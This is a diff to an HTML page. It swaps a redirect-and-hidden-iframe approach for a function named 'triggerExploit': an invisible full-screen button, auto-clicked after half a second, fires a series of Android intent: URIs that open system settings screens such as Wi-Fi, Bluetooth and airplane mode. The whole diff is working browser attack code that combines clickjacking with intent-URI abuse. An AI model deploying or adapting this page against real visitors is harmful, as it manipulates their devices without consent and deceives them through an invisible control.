@@ -1,23 +1,35 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <!-- First, go to a legitimate site -->
-  <meta http-equiv="refresh" content="0;url=https://google.com">
-</head>
-<body>
+<body style="margin: 0; padding: 0;">
+  <!-- Full-screen invisible button -->
+  <button onclick="triggerExploit()" 
+          style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; opacity: 0.01; cursor: default;">
+    Invisible trigger
+  </button>
+  
   <script>
-    // Then immediately redirect from there
-    setTimeout(() => {
-      window.location = 'intent:#Intent;action=android.settings.AIRPLANE_MODE_SETTINGS;end';
-    }, 50);
+    function triggerExploit() {
+      // Try multiple targets
+      var targets = [
+        'intent:#Intent;action=android.settings.SETTINGS;end',
+        'intent:#Intent;action=android.settings.WIFI_SETTINGS;end',
+        'intent:#Intent;action=android.settings.BLUETOOTH_SETTINGS;end',
+        'intent:#Intent;action=android.settings.AIRPLANE_MODE_SETTINGS;end',
+        'intent:#Intent;action=android.settings.DEVICE_INFO_SETTINGS;end'
+      ];
+      
+      // Try each one
+      targets.forEach((target, index) => {
+        setTimeout(() => {
+          window.location = target;
+        }, index * 100);
+      });
+    }
     
-    // Or use iframe trick
-    window.onload = function() {
-      var iframe = document.createElement('iframe');
-      iframe.style.display = 'none';
-      iframe.src = 'intent:#Intent;action=android.settings.BLUETOOTH_SETTINGS;end';
-      document.body.appendChild(iframe);
-    };
+    // Auto-click after short delay
+    setTimeout(() => {
+      document.querySelector('button').click();
+    }, 500);
   </script>
 </body>
 </html>
